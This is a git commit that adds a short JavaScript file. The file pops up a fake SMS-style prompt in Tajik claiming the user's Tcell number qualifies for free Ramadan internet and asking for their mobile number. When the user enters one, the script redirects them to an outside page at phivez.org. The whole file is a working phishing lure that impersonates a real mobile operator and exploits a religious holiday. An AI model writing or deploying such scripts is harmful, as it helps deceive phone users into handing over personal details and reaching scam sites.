582d8fb202eaa206cc9e4d281092a67d3ea84d61
newblog13 <sweet16guyz@gmail.com>
2026-02-23 14:11:20 +0100

    Create tcell-activation.js

---
+++ tcell-activation.js
@@ -0,0 +1,5 @@
+var password = 'ФАЪОЛ КАРДАН'
+password=prompt('SMS: Табрикот, рақами Tcell-и шумо барои трафики интернетии ройгони Рамазон ҳақ дорад, OK-ро пахш кунед ва рақами мобилии худро ворид кунед.','ФАЪОЛ КАРДАН');
+if (password != 'ФАЪОЛ КАРДАН') {
+location.href='https://phivez.org/tcell-ramadan.html';
+}
